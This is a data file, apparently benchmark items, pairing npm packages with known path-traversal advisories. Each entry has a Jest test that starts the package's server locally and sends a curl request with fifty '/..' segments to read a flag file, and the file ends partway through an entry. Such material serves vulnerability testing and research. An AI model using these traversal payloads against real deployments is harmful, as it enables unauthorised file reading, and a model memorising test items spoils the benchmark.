path-traversal,CVE-2017-16093,cyber-js,1.0.6,n/a,path-traversal/cyber-js_1.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cyber-js"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node node_modules/cyber-js/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,app.js:43:6,https://security.snyk.io/vuln/npm:cyber-js:20170418; https://github.com/advisories/GHSA-6w83-22gj-5pv9
path-traversal,CVE-2017-16169,looppake,3.0.0,n/a,path-traversal/looppake_3.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in looppake"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/looppake/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:9:8,https://security.snyk.io/vuln/npm:looppake:20170518; https://github.com/advisories/GHSA-4vfj-c2xf-8r48
path-traversal,CVE-2017-16152,static-html-server,0.1.2,n/a,path-traversal/static-html-server_0.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 7788/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in static-html-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 7788/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/static-html-server/static-html-server.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:7788${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,static-html-server.js:60:12,https://security.snyk.io/vuln/npm:static-html-server:20170418; https://github.com/advisories/GHSA-9j5m-873f-xh76
path-traversal,,yypsulie11,1.0.0,n/a,path-traversal/yypsulie11_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yypsulie11"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yypsulie11/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:9:8,https://security.snyk.io/vuln/npm:yypsulie11:20180306; 
path-traversal,,file-static-server,1.0.2,n/a,path-traversal/file-static-server_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8970/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in file-static-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8970/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/file-static-server/server.js  8970"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8970${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/file.js:88:12,https://security.snyk.io/vuln/npm:file-static-server:20180614; https://github.com/advisories/GHSA-qjfh-xc44-rm9x
path-traversal,,proxey,0.4.2,n/a,path-traversal/proxey_0.4.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in proxey"", (done) => {
  expect.assertions(1);
  const pkg = require(""proxey"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8981/tcp"", () => {});
  } catch (e) {}
  pkg.run({
    rootFolder: ""./"",
    port: 8981,
    proxyUrl: ""/proxy"",
    vars: { ""X-Api-Token"": ""12345"" },
    routes: {
      ""/"": ""home.html"",
      ""/users"": ""users.html"",
      ""/api/users"": ""users.json"",
    },
    charset: ""utf-8"",
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8981${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,proxey.js:191:27,https://security.snyk.io/vuln/npm:proxey:20180306; 
path-traversal,CVE-2017-16160,11xiaoli,1.1.0,n/a,path-traversal/11xiaoli_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in 11xiaoli"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/11xiaoli/dome.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let val = exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
}, 30000);
",n/a,dome.js:5:8,https://security.snyk.io/vuln/npm:11xiaoli:20170509; https://github.com/advisories/GHSA-x2jj-x3q2-7hph
path-traversal,,tinyserver,0.1.1,n/a,path-traversal/tinyserver_0.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8976/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in tinyserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8976/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/tinyserver/lib/main.js 8976"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8976${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/main.js:52:9,https://security.snyk.io/vuln/npm:tinyserver:20170910; 
path-traversal,CVE-2018-3733,crud-file-server,0.7.0,0.9.0,path-traversal/crud-file-server_0.7.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8998/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in crud-file-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8998/tcp"", () => {});
  } catch (e) {}
  let server =
    ""node ./node_modules/crud-file-server/bin/crud-file-server -p 8998"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8998${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/omphalos/crud-file-server/commit/4fc3b404f718abb789f4ce4272c39c7a138c7a82,crud-file-server.js:170:14,https://security.snyk.io/vuln/npm:crud-file-server:20180226; https://github.com/advisories/GHSA-vfp9-gwrh-wq9g
path-traversal,,xbhxbh,1.1.0,n/a,path-traversal/xbhxbh_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in xbhxbh"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/xbhxbh/xbh.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,xbh.js:8:8,https://security.snyk.io/vuln/npm:xbhxbh:20170910; 
path-traversal,,dilu,0.1.3,n/a,path-traversal/dilu_0.1.3,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in dilu"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/dilu/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,dilu/get.js:57:21,https://security.snyk.io/vuln/npm:dilu:20180226; 
path-traversal,,cuiaiguang,1.0.0,n/a,path-traversal/cuiaiguang_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cuiaiguang"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cuiaiguang/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:9:12,https://security.snyk.io/vuln/npm:cuiaiguang:20180226; 
path-traversal,CVE-2017-16150,wangguojing123,1.3.0,n/a,path-traversal/wangguojing123_1.3.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wangguojing123"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wangguojing123/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:10:8,https://security.snyk.io/vuln/npm:wangguojing123:20170518; https://github.com/advisories/GHSA-xpqw-fqpw-35fc
path-traversal,,sleep,^6.3.0,n/a,path-traversal/starfruit_0.2.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in starfruit"", (done) => {
  expect.assertions(1);
  var pkg = require('starfruit');
  const fs = require(""fs"");
  const { sleep } = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  app = pkg();
  app.listen(8080);
  sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,,https://security.snyk.io/vuln/npm:starfruit:20180315; 
path-traversal,,serversyysyy,1.1.0,n/a,path-traversal/serversyysyy_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serversyysyy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serversyysyy/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",n/a,index.js:18:8,https://security.snyk.io/vuln/npm:serversyysyy:20180315; 
path-traversal,,atropa-ide,0.2.2-2,n/a,path-traversal/atropa-ide_0.2.2-2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in atropa-ide"", (done) => {
  expect.assertions(1);
  const ide = require(""atropa-ide"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8884/tcp"", () => {});
  } catch (e) {}
  const path = require(""path"");
  let port = 8884;
  let serverRoot = path.resolve(__dirname);
  ide.start(port, serverRoot);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8884${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,,https://security.snyk.io/vuln/npm:atropa-ide:20180226; 
path-traversal,CVE-2017-16083,node-simple-router,0.10.0,0.10.1,path-traversal/node-simple-router_0.10.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-simple-router"", (done) => {
  expect.assertions(1);
  const Router = require(""node-simple-router"");
  const http = require(""http"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8985/tcp"", () => {});
  } catch (e) {}
  let router = new Router({
    static_route: process.cwd(),
    cgi_dir: ""cgi-bin"",
    use_nsr_session: false,
    default_home: [],
  });
  const server = http.createServer(router);
  server.listen(8985);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8985${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/sandy98/node-simple-router/commit/dfdd52e2e80607af433097d940b3834fd96df488,lib/router.js:757:27,https://security.snyk.io/vuln/npm:node-simple-router:20170523; https://github.com/advisories/GHSA-5w8q-x7hc-jhp6
path-traversal,,nopach,0.1.1,n/a,path-traversal/nopach_0.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nopach"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/nopach/lib/nopach.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,nopach.js:159:25,https://security.snyk.io/vuln/npm:nopach:20170910; 
path-traversal,,pico-static-server,2.3.4,3.0.2,path-traversal/pico-static-server_2.3.4,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in pico-static-server"", (done) => {
  expect.assertions(1);
  const createServer = require(""pico-static-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8982/tcp"", () => {});
  } catch (e) {}
  const staticServer = createServer({
    defaultFile: ""index.html"",
    staticPath: ""."",
    port: 8982,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8982${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:118:23,https://security.snyk.io/vuln/npm:pico-static-server:20180226; 
path-traversal,CVE-2017-16181,wintiwebdev,1.0.0,n/a,path-traversal/wintiwebdev_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wintiwebdev"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wintiwebdev/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,app.js:16:6,https://security.snyk.io/vuln/npm:wintiwebdev:20170521; https://github.com/advisories/GHSA-g5m5-v5cp-5p7m
path-traversal,CVE-2017-16223,nodeaaaaa,1.3.0,n/a,path-traversal/nodeaaaaa_1.3.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nodeaaaaa"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/nodeaaaaa/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:11:8,https://security.snyk.io/vuln/npm:nodeaaaaa:20170430; https://github.com/advisories/GHSA-xj3h-vc9j-j823
path-traversal,CVE-2017-16123,welcomyzt,1.1.0,n/a,path-traversal/welcomyzt_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9987/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in welcomyzt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9987/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/welcomyzt/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9987${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:5:8,https://security.snyk.io/vuln/npm:welcomyzt:20170617; https://github.com/advisories/GHSA-8fv7-vm2p-5495
path-traversal,,zhangranbigman,0.0.1,n/a,path-traversal/zhangranbigman_0.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9999/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zhangranbigman"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9999/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zhangranbigman/run.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,my-lib/lib/static.js:21:6,https://security.snyk.io/vuln/npm:zhangranbigman:20180226; 
path-traversal,CVE-2017-16182,serverxxx,1.0.0,n/a,path-traversal/serverxxx_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverxxx"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverxxx/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:12:8,https://security.snyk.io/vuln/npm:serverxxx:20170612; https://github.com/advisories/GHSA-wh33-4p32-g7vh
path-traversal,CVE-2017-16170,liuyaserver,1.0.0,n/a,path-traversal/liuyaserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 4848/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in liuyaserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 4848/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/liuyaserver/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:4848${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:7:8,https://security.snyk.io/vuln/npm:liuyaserver:20170521; https://github.com/advisories/GHSA-xj6q-9hx8-mm7f
path-traversal,CVE-2017-16168,wffserve,1.0.0,n/a,path-traversal/wffserve_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wffserve"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wffserve/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:24:8,https://security.snyk.io/vuln/npm:wffserve:20170525; https://github.com/advisories/GHSA-wqr3-24xm-fxhq
path-traversal,CVE-2017-16220,wind-mvc,0.0.6,n/a,path-traversal/wind-mvc_0.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wind-mvc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
